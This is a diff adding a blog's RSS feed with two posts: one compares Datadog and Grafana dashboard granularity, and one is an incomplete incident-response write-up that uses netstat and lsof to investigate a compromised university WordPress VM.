@@ -1,0 +1,842 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on R4J</title><link>https://rajsimmanravi.github.io/post/</link><description>Recent content in Posts on R4J</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 04 Jul 2020 12:45:43 -0500</lastBuildDate><atom:link href="https://rajsimmanravi.github.io/post/index.xml" rel="self" type="application/rss+xml"/><item><title>Datadog vs Grafana Dashboards</title><link>https://rajsimmanravi.github.io/p/datadog-vs-grafana-dashboards/</link><pubDate>Sat, 04 Jul 2020 12:45:43 -0500</pubDate><guid>https://rajsimmanravi.github.io/p/datadog-vs-grafana-dashboards/</guid><description>&lt;img src="https://rajsimmanravi.github.io/post/datadog-grafana/unsplash-dashboard.jpg" alt="Featured image of post Datadog vs Grafana Dashboards" />&lt;p>When comparing dashboards between Datadog and Grafana, we often find discrepancies between them. Even though both Datadog and Grafana scrape metrics from the same source, we see vastly differing visualizations and we often wonder which has a better accuracy compared to the source of truth. In this blog post, we explore the discrepancies between Grafana and DataDog dashboards and how we can resolve/understand them. We begin by giving a brief overview on the data (or metrics) being collected.&lt;/p>
+&lt;h2 id="openmetrics">Openmetrics
+&lt;/h2>&lt;p>Openmetrics is the standard for collecting metrics. It supports text format representation that allows applications and infrastructure resources to post text-based metrics on an endpoint (eg. https://xxx:8080/metrics) and allow agents to scrape (collect) metrics from that webpage. An example of the text-format metrics is shown here: &lt;strong>&lt;a class="link" href="https://prometheus.io/docs/instrumenting/exposition_formats/#text-based-format" target="_blank" rel="noopener"
+>https://prometheus.io/docs/instrumenting/exposition_formats/#text-based-format&lt;/a>&lt;/strong>.&lt;/p>
+&lt;p>We follow this methodology and allow Prometheus and Datadog agents to scrape metrics. Here is an example:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-console" data-lang="console">&lt;span class="line">&lt;span class="cl">&lt;span class="go">...
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">am_request_latency_seconds_bucket{endpoint=&amp;#34;/healthz&amp;#34;,le=&amp;#34;7.5&amp;#34;,method=&amp;#34;GET&amp;#34;} 782.0
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">am_request_latency_seconds_bucket{endpoint=&amp;#34;/healthz&amp;#34;,le=&amp;#34;10.0&amp;#34;,method=&amp;#34;GET&amp;#34;} 782.0
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">am_request_latency_seconds_bucket{endpoint=&amp;#34;/healthz&amp;#34;,le=&amp;#34;+Inf&amp;#34;,method=&amp;#34;GET&amp;#34;} 782.0
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">am_request_latency_seconds_count{endpoint=&amp;#34;/healthz&amp;#34;,method=&amp;#34;GET&amp;#34;} 782.0
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">am_request_latency_seconds_sum{endpoint=&amp;#34;/healthz&amp;#34;,method=&amp;#34;GET&amp;#34;} 0.18804121017456055
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">am_request_latency_seconds_sum{endpoint=&amp;#34;/healthz&amp;#34;,method=&amp;#34;GET&amp;#34;} 0.18804121017456055
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">&lt;/span>&lt;span class="gp">#&lt;/span> HELP am_request_count Answering Machine Request Count
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="gp">#&lt;/span> TYPE am_request_count counter
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">am_request_count{endpoint=&amp;#34;/&amp;#34;,http_status=&amp;#34;400&amp;#34;,method=&amp;#34;GET&amp;#34;} 72.0
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">am_request_count{endpoint=&amp;#34;/healthz&amp;#34;,http_status=&amp;#34;200&amp;#34;,method=&amp;#34;GET&amp;#34;} 782.0
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>From viewing the metrics, we notice two types:&lt;/p>
+&lt;ul>
+&lt;li>Summaries (metrics that end in &lt;code>_sum&lt;/code> and &lt;code>_count&lt;/code>)&lt;/li>
+&lt;li>Histograms (metrics that end in &lt;code>_bucket&lt;/code>)&lt;/li>
+&lt;/ul>
+&lt;h2 id="summaries">Summaries
+&lt;/h2>&lt;p>Based on the description of a summary: &lt;strong>&lt;a class="link" href="https://prometheus.io/docs/concepts/metric_types/#summary" target="_blank" rel="noopener"
+>https://prometheus.io/docs/concepts/metric_types/#summary&lt;/a>&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>the &lt;strong>total sum&lt;/strong> of all observed values, exposed as &lt;code>&amp;lt;basename&amp;gt;_sum&lt;/code>&lt;/li>
+&lt;li>the &lt;strong>count&lt;/strong> of events that have been observed, exposed as &lt;code>&amp;lt;basename&amp;gt;_count&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>Note that they are counters and so they are always increasing. For more reference, please visit here: &lt;strong>&lt;a class="link" href="https://prometheus.io/docs/practices/histograms/#count-and-sum-of-observations" target="_blank" rel="noopener"
+>https://prometheus.io/docs/practices/histograms/#count-and-sum-of-observations&lt;/a>&lt;/strong>.&lt;/p>
+&lt;p>For the usecase going forward for summaries, we&amp;rsquo;ll use &lt;strong>am_request_count&lt;/strong> metric as example.&lt;/p>
+&lt;h2 id="grafana-dashboard-for-request-count-for-healthz-endpoint">Grafana Dashboard for Request Count for /healthz endpoint
+&lt;/h2>&lt;p>The graph shown below is for the &lt;strong>Last 15 minutes&lt;/strong> of the &lt;strong>Request Count&lt;/strong> for &lt;strong>/healthz&lt;/strong> endpoint. As you can see, the value is almost-flat at &lt;strong>55&lt;/strong> - &lt;strong>56&lt;/strong> req/sec. An important note about a Grafana dashboard is that the smallest granularity (or shortest interval) between data points is &lt;strong>30&lt;/strong> seconds if the time period (highlighted in yellow box on the first screenshot below) is small enough from &lt;strong>Last 5 mins&lt;/strong> till &lt;strong>Last 3 hours&lt;/strong>. After that, it becomes 1 min, 2min, 4min etc. for longer time periods (&lt;strong>Last 6 hours, Last 12 hours,&amp;hellip;&lt;/strong>).&lt;/p>
+&lt;p>&lt;img src="https://rajsimmanravi.github.io/post/datadog-grafana/grafanaGraph.png"
+loading="lazy"
+alt="grafana_graph"
+>&lt;/p>
+&lt;p>The Prometheus query is: &lt;code>am_request_count:sum(endpoint=~&amp;quot;$endpoint&amp;quot;)&lt;/code>.&lt;/p>
+&lt;p>&lt;img src="https://rajsimmanravi.github.io/post/datadog-grafana/prometheusGraph.png"
+loading="lazy"
+alt="Prometheus dashboard"
+>&lt;/p>
+&lt;p>From looking at the Prometheus dashboard above, we can confirm the value stays within 55-56.&lt;/p>
+&lt;h2 id="datadog-dashboard-for-request-count-for-healthz-endpoint">DataDog Dashboard for Request Count for /healthz endpoint
+&lt;/h2>&lt;p>Now we replicate the same Grafana dashboard:&lt;/p>
+&lt;p>&lt;img src="https://rajsimmanravi.github.io/post/datadog-grafana/ddgraph.png"
+loading="lazy"
+alt="DataDog"
+>&lt;/p>
+&lt;p>As you can see, the values are widely different (values fluctuate around 25-30). Why?&lt;/p>
+&lt;h3 id="main-cause-of-discrepancy-data-interval-granularity">Main cause of discrepancy: Data Interval Granularity
+&lt;/h3>&lt;p>Datadog&amp;rsquo;s granularity is &lt;strong>5 secs&lt;/strong> (as opposed to &lt;strong>30 secs&lt;/strong> in Grafana) for the &lt;strong>Past 15 Minutes&lt;/strong>. Also, Datadog&amp;rsquo;s interval increases as the time period widens (same as Grafana). The main reason is that Datadog has a restriction of maximum &lt;code>300 datapoints&lt;/code> in the graph (regardless of the time period). Thus, as the time frame widens, each data point will represent more and more of an aggregated value (and vice versa if time period is shortened).&lt;/p>
+&lt;p>Therefore, not much aggregation happens for &lt;strong>Past 15 minutes&lt;/strong> time period in DataDog. Now, if we aggregate to 30 secs, the graph look similar to Grafana as shown below:&lt;/p>
+&lt;p>&lt;img src="https://rajsimmanravi.github.io/post/datadog-grafana/grafanaAggGraph.png"
+loading="lazy"
+alt="grafanaAggGraph"
+>.&lt;/p>
+&lt;h2 id="conclusion">Conclusion
+&lt;/h2>&lt;p>Grafana does a lot of aggregation compared to Datadog. For more information regarding data aggregation in DataDog, please refer to: &lt;strong>&lt;a class="link" href="https://docs.datadoghq.com/dashboards/querying/#rollup-to-aggregate-over-time" target="_blank" rel="noopener"
+>https://docs.datadoghq.com/dashboards/querying/#rollup-to-aggregate-over-time&lt;/a>&lt;/strong>.&lt;/p></description></item><item><title>Uncovering Cryptojacking/Phishing At University of Toronto</title><link>https://rajsimmanravi.github.io/p/uncovering-cryptojacking/phishing-at-university-of-toronto/</link><pubDate>Sat, 06 Jun 2020 17:50:51 -0500</pubDate><guid>https://rajsimmanravi.github.io/p/uncovering-cryptojacking/phishing-at-university-of-toronto/</guid><description>&lt;img src="https://rajsimmanravi.github.io/post/cryptojacking-phishing-savi/unsplash-coding.jpg" alt="Featured image of post Uncovering Cryptojacking/Phishing At University of Toronto" />&lt;p>During my Masters work at University of Toronto (U of T), my research group was responsible for building and maintaining an OpenStack-based Cloud infrastructure such that other research teams from various universities can utilize this Cloud platform. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how I investigated this issue on our platform.&lt;/p>
+&lt;p>&amp;#x26a1; &lt;strong>Note that for privacy concerns, I removed the actual website domain and removed some parts of the public IP addresses.&lt;/strong>&lt;/p>
+&lt;h2 id="network-analysis">Network Analysis
+&lt;/h2>&lt;p>I began my analysis by looking at the network connections on the virtual machine:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-console" data-lang="console">&lt;span class="line">&lt;span class="cl">&lt;span class="go">user@host:~$ sudo netstat -an
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">Active Internet connections (servers and established)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">Proto Recv-Q Send-Q Local Address Foreign Address State
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 0 0.0.0.0:25 0.0.0.0:* LISTEN
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 0 10.10.10.10:38252 204.188.217.xx:80 ESTABLISHED
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 0 10.10.10.10:22 10.10.10.12:58172 ESTABLISHED
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp 0 0 10.10.10.10:55387 204.188.217.xx:80 ESTABLISHED
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp6 0 0 :::80 :::* LISTEN
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp6 0 0 :::22 :::* LISTEN
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp6 0 0 :::25 :::* LISTEN
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">tcp6 0 0 :::443 :::* LISTEN
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">udp 0 0 10.10.10.10:123 0.0.0.0:*
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">udp 0 0 127.0.0.1:123 0.0.0.0:*
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">udp 0 0 0.0.0.0:123 0.0.0.0:*
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">udp 0 0 0.0.0.0:59028 0.0.0.0:*
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">udp 0 0 127.0.0.1:18120 0.0.0.0:*
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">udp 0 0 0.0.0.0:1812 0.0.0.0:*
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">udp 0 0 0.0.0.0:1813 0.0.0.0:*
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">udp 0 0 0.0.0.0:1814 0.0.0.0:*
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">udp 0 0 0.0.0.0:51414 0.0.0.0:*
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">udp6 0 0 fe80::219:b9ff:fe2c:123 :::*
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">udp6 0 0 ::1:123 :::*
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">udp6 0 0 :::123 :::*
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Based on the &lt;strong>netstat connections&lt;/strong>, I realized a few &lt;strong>&lt;code>tcp&lt;/code>&lt;/strong> connections were using the port &lt;strong>80&lt;/strong>. So I took a peek on the processes using these connections:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-console" data-lang="console">&lt;span class="line">&lt;span class="cl">&lt;span class="go">user@host:~$ sudo lsof -i tcp:80 -P -R
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">COMMAND PID PPID USER FD TYPE DEVICE SIZE/OFF NODE NAME
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">/usr/sbin 26545 1 www-data 3u IPv4 22142705 0t0 TCP website.ca:55464-&amp;gt;204.188.217.xx:80 (ESTABLISHED)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">/usr/sbin 26550 1 www-data 3u IPv4 22105560 0t0 TCP website.ca:38252-&amp;gt;204.188.217.xx:80 (ESTABLISHED)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">apache2 27805 1 root 4u IPv6 10024448 0t0 TCP *:80 (LISTEN)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">apache2 27993 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">apache2 28066 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">apache2 28067 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">apache2 28447 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">apache2 28449 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">apache2 29256 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">apache2 29262 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">apache2 29373 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">apache2 29375 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">apache2 29436 27805 www-data 4u IPv6 10024448 0t0 TCP *:80 (LISTEN)
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The connections to some IP address with port &lt;strong>80&lt;/strong> looked interesting and so I took a deeper dive on the process &lt;strong>26545&lt;/strong>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-console" data-lang="console">&lt;span class="line">&lt;span class="cl">&lt;span class="go">user@host:~$ sudo lsof -p 26545
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">/usr/sbin 26545 www-data cwd DIR 252,0 69632 3538945 /tmp
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">/usr/sbin 26545 www-data rtd DIR 252,0 4096 2 /
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">/usr/sbin 26545 www-data txt REG 252,0 10416 3017043 /usr/bin/perl
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">/usr/sbin 26545 www-data mem REG 252,0 43416 4981915 /usr/lib/perl/5.18.2/auto/Socket/Socket.so
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">/usr/sbin 26545 www-data mem REG 252,0 18728 4981918 /usr/lib/perl/5.18.2/auto/IO/IO.so
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">/usr/sbin 26545 www-data mem REG 252,0 43368 6946983 /lib/x86_64-linux-gnu/libcrypt-2.19.so
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">/usr/sbin 26545 www-data mem REG 252,0 141574 6947044 /lib/x86_64-linux-gnu/libpthread-2.19.so
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">/usr/sbin 26545 www-data mem REG 252,0 1071552 6946910 /lib/x86_64-linux-gnu/libm-2.19.so
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">/usr/sbin 26545 www-data mem REG 252,0 14664 6946980 /lib/x86_64-linux-gnu/libdl-2.19.so
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">/usr/sbin 26545 www-data mem REG 252,0 1840928 6947193 /lib/x86_64-linux-gnu/libc-2.19.so
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">/usr/sbin 26545 www-data mem REG 252,0 1608280 3017046 /usr/lib/libperl.so.5.18.2
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">/usr/sbin 26545 www-data mem REG 252,0 149120 6947052 /lib/x86_64-linux-gnu/ld-2.19.so
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">/usr/sbin 26545 www-data 0r CHR 1,3 0t0 6368 /dev/null
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">/usr/sbin 26545 www-data 1w FIFO 0,8 0t0 22105555 pipe
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">/usr/sbin 26545 www-data 2w REG 252,0 14135 10751213 /var/log/apache2/error.log
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">/usr/sbin 26545 www-data 3u IPv4 22143052 0t0 TCP website.ca:55789-&amp;gt;204.188.217.xx:http (ESTABLISHED)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">/usr/sbin 26545 www-data 6u unix 0xffff88022e742c00 0t0 22105553 socket
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>There were &lt;strong>perl&lt;/strong> scripts running and also the process was accessing &lt;code>/var/log/apache2/error.log&lt;/code>. I noticed the IP address &lt;code>204.188.217.xx&lt;/code> kept recurring and I knew it was related to the webserver. My next stop was to look at the application itself.&lt;/p>
+&lt;h2 id="applications-analysis">Applications Analysis
+&lt;/h2>&lt;p>I started checking the &lt;code>/var/www&lt;/code> directory to check for any activity by the user &lt;code>www-data&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-console" data-lang="console">&lt;span class="line">&lt;span class="cl">&lt;span class="go">user@host:/var/www$ ls -la
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">total 56
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">drwxr-xr-x 13 root root 4096 Sep 10 22:37 .
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">drwxr-xr-x 13 root root 4096 Feb 28 2017 ..
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">drwxr-xr-x 5 root root 4096 Oct 3 2016 alg.old
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">drwxr-xr-x 8 root root 4096 Aug 23 2013 corporateclean
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">drwxr-xr-x 2 root root 4096 Jul 17 2012 demo
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">drwxr-xr-x 2 root root 4096 Feb 1 2017 html
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">drwxr-xr-x 11 www-data www-data 4096 Sep 3 23:52 subdomain
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">drwxr-xr-x 5 root root 4096 Nov 29 2017 nal
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">drwxr-xr-x 2 root root 4096 Mar 3 2015 phpmyadmin
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">drwxrwxr-x 6 www-data www-data 4096 Feb 5 2018 site
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">drwxr-xr-x 8 root root 4096 Feb 28 2017 site-wp-3.3
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">drwxr-xr-x 6 stack stack 4096 Feb 28 2017 site-wp-3.5
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">drwxr-xr-x 6 stack stack 4096 Feb 28 2017 site-wp-3.7
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="go">-rw-r--r-- 1 root root 21 May 4 2012 test.php
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
